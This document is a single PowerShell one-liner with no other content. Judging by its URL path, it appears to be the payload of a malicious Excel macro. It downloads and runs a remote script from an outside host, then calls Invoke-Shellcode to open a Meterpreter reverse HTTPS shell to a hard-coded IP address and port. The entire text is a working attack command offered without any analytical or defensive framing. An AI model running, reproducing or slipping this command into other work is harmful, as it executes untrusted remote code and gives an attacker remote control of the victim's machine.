IEX (New-Object Net.WebClient).DownloadString('http://neri.ovh/exploit/excelmacro/windows.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 91.121.181.103 -Lport 8443 -Force
